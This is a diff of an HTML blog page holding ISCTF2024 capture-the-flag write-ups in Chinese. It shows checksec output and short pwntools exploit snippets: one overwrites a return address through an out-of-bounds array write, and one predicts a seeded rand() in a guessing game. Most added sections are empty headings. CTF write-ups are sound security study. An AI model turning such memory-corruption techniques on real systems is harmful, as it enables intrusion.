@@ -4,7 +4,7 @@
   <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>haoo&#39;s tech blog - ISCTF2024</title>
-<meta name="description" content="Netcat通过题目描述可以知道，这是一道nc题目，那就直接连接一下看看 easy pwn!just have funISCTF&amp;#123;5033fc9a-b09c-4fd3-8551-0cb22283d299&amp;#125; OK，直接给flag，那就没什么说的了。 girlfriend先看一下开启了哪些保护 [*] ">
+<meta name="description" content="PwnNetcat通过题目描述可以知道，这是一道nc题目，那就直接连接一下看看 easy pwn!just have funISCTF&amp;#123;5033fc9a-b09c-4fd3-8551-0cb22283d299&amp;#125; OK，直接给flag，那就没什么说的了。 girlfriend先看一下开启了哪些保护 [">
 <meta name="theme-color" content="#090c0b">
 <meta name="color-scheme" content="dark">
 <script>
@@ -75,7 +75,7 @@
     <article class="article-wrap">
       <header class="article-header">
         <div class="post-meta">
-          <span>3133 字</span>
+          <span>3272 字</span>
         </div>
         <h1>ISCTF2024</h1>
         
@@ -92,11 +92,11 @@
 
       <div class="article-grid">
         <div class="article-body article-prose" id="article-content">
-          <h1 id="Netcat"><a href="#Netcat" class="headerlink" title="Netcat"></a>Netcat</h1><p>通过题目描述可以知道，这是一道nc题目，那就直接连接一下看看</p>
+          <h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><h2 id="Netcat"><a href="#Netcat" class="headerlink" title="Netcat"></a>Netcat</h2><p>通过题目描述可以知道，这是一道nc题目，那就直接连接一下看看</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">easy pwn!<br>just have fun<br>ISCTF&#123;5033fc9a-b09c-4fd3-8551-0cb22283d299&#125;<br></code></pre></td></tr></table></figure>
 
 <p>OK，直接给flag，那就没什么说的了。</p>
-<h1 id="girlfriend"><a href="#girlfriend" class="headerlink" title="girlfriend"></a>girlfriend</h1><p>先看一下开启了哪些保护</p>
+<h2 id="girlfriend"><a href="#girlfriend" class="headerlink" title="girlfriend"></a>girlfriend</h2><p>先看一下开启了哪些保护</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">[*] &#x27;/mnt/d/国内赛/ISCTF2024/girlfriend&#x27;<br>    Arch:       amd64-64-little<br>    RELRO:      Partial RELRO<br>    Stack:      No canary found<br>    NX:         NX enabled<br>    PIE:        No PIE (0x400000)<br>    SHSTK:      Enabled<br>    IBT:        Enabled<br>    Stripped:   No<br></code></pre></td></tr></table></figure>
 
 <p>很常规，放入ida中进行分析</p>
@@ -105,7 +105,7 @@
 <p>看起来挺有意思的，这道题目并不是传统的栈溢出，这道题目要使用数组越界修改返回地址。首先先利用栈上的输入修改s1的值为”admin\x00”，从而能够进入vuln函数。分析一下进入vuln函数后栈上的分布，在v1[5]处存放的是n7，v1[6]存放的是rbp，v1[7]存放的是返回地址，所以先输入5次后要注意下如何修改n7的值，还有一点就是这道题要输入整形，所以得将16进制数改为10进制数。exp如下：</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">amaze = 0x401216<br>ret = 0x000000000040101a<br>payload = cyclic(0x28) + b&quot;admin\x00&quot;<br>sl(payload)<br>sl(b&quot;1&quot;)<br>sl(b&quot;1&quot;)<br>sl(b&quot;1&quot;)<br>sl(b&quot;1&quot;)<br>sl(b&quot;1&quot;)<br>sl(b&quot;5&quot;)<br>sl(b&quot;0&quot;)<br>sl(b&quot;4198942&quot;)<br></code></pre></td></tr></table></figure>
 
-<h1 id="ez-game"><a href="#ez-game" class="headerlink" title="ez_game"></a>ez_game</h1><p>依然先看一下开启了哪些保护</p>
+<h2 id="ez-game"><a href="#ez-game" class="headerlink" title="ez_game"></a>ez_game</h2><p>依然先看一下开启了哪些保护</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">[*] &#x27;/mnt/d/国内赛/ISCTF2024/ez_game/ez_game&#x27;<br>    Arch:       amd64-64-little<br>    RELRO:      Partial RELRO<br>    Stack:      No canary found<br>    NX:         NX enabled<br>    PIE:        No PIE (0x400000)<br>    SHSTK:      Enabled<br>    IBT:        Enabled<br>    Stripped:   No<br></code></pre></td></tr></table></figure>
 
 <p>放入ida中进行分析</p>
@@ -114,7 +114,7 @@
 <p>是一道猜数的题目，尽管这道题目给了明显的栈溢出函数gets，但是由于这是在猜数循环前的，因此无法利用这个栈溢出。这道题目考查的就是伪随机数，这里就直接上exp了：</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">libc = ctypes.CDLL(libc_file)<br>libc.srand(1)<br><br>payload = b&#x27;a\n&#x27;<br>for _ in range(0x4e21):   # 20001<br>    payload += str(libc.rand() % 7 + 1).encode() + b&#x27;\n&#x27;<br>s(payload)<br></code></pre></td></tr></table></figure>
 
-<h1 id="0verf10w"><a href="#0verf10w" class="headerlink" title="0verf10w"></a>0verf10w</h1>
+<h2 id="0verf10w"><a href="#0verf10w" class="headerlink" title="0verf10w"></a>0verf10w</h2><h2 id="orange"><a href="#orange" class="headerlink" title="orange"></a>orange</h2><h2 id="ret2orw"><a href="#ret2orw" class="headerlink" title="ret2orw"></a>ret2orw</h2><h2 id="syscall"><a href="#syscall" class="headerlink" title="syscall"></a>syscall</h2><h2 id="小蓝鲨stack"><a href="#小蓝鲨stack" class="headerlink" title="小蓝鲨stack"></a>小蓝鲨stack</h2><h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><h2 id="Ezre"><a href="#Ezre" class="headerlink" title="Ezre"></a>Ezre</h2><h2 id="MIPS"><a href="#MIPS" class="headerlink" title="MIPS"></a>MIPS</h2><h2 id="py不好，会被ban"><a href="#py不好，会被ban" class="headerlink" title="py不好，会被ban"></a>py不好，会被ban</h2><h2 id="《回忆安魂曲》——第三章：逃不出的黑墙"><a href="#《回忆安魂曲》——第三章：逃不出的黑墙" class="headerlink" title="《回忆安魂曲》——第三章：逃不出的黑墙"></a>《回忆安魂曲》——第三章：逃不出的黑墙</h2><h2 id="《回忆安魂曲》——第二章：当记忆被割裂"><a href="#《回忆安魂曲》——第二章：当记忆被割裂" class="headerlink" title="《回忆安魂曲》——第二章：当记忆被割裂"></a>《回忆安魂曲》——第二章：当记忆被割裂</h2><h2 id="《回忆安魂曲》——第四章：退！初识凤仙儿"><a href="#《回忆安魂曲》——第四章：退！初识凤仙儿" class="headerlink" title="《回忆安魂曲》——第四章：退！初识凤仙儿"></a>《回忆安魂曲》——第四章：退！初识凤仙儿</h2><h2 id="你知道-elf文件嘛"><a href="#你知道-elf文件嘛" class="headerlink" title="你知道.elf文件嘛"></a>你知道.elf文件嘛</h2><h2 id="嘿嘿嘿"><a href="#嘿嘿嘿" class="headerlink" title="嘿嘿嘿"></a>嘿嘿嘿</h2><h2 id="找啊找"><a href="#找啊找" class="headerlink" title="找啊找"></a>找啊找</h2><h2 id="桀桀桀"><a href="#桀桀桀" class="headerlink" title="桀桀桀"></a>桀桀桀</h2><h2 id="萝卜子的螃蟹"><a href="#萝卜子的螃蟹" class="headerlink" title="萝卜子的螃蟹"></a>萝卜子的螃蟹</h2>
         </div>
 
         
